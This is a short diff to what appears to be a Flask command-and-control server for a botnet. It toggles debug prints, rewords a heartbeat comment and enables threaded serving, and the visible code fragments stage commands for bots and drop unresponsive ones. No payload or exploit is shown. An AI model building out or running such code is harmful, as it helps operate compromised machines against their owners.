@@ -267,7 +267,7 @@ def botpush(target):
             query_bot = Bot.query.filter_by(id=bot_id).first()
 
         cmd = Command(cmd, query_bot.id, query_bot.ip)
-        #print(cmd)
+        print(cmd)
 
         # Actually push the command to the bot. If there is a previous command queued (making len(query_bot.cmds) >=1 ), ignore.
         try:
@@ -275,7 +275,7 @@ def botpush(target):
             db.session.add(cmd)
             db.session.commit()
 
-            print("[DEBUG] Command staged")
+            #print("[DEBUG] Command staged")
 
             return jsonify({'result': 'Command staged'})
 
@@ -408,7 +408,7 @@ def refresh():
         return ''
 
     try:
-        # If bot missed three heartbeat interval (default is 40seconds*3 = 120 seconds), then remove the bot. We lost it. 
+        # If bot missed two~three heartbeat interval (default is 40seconds*3 = 120 seconds), then remove the bot. We lost it. 
         for bot in botlist:
             if (datetime.now() - bot.timestamp).total_seconds() > TIMER*3:
                 db.session.delete(bot)
@@ -645,4 +645,4 @@ def init_db():
 init_db()
 
 if __name__ == '__main__':
-    app.run(host=HOST, port=PORT)
+    app.run(host=HOST, port=PORT, threaded=True)
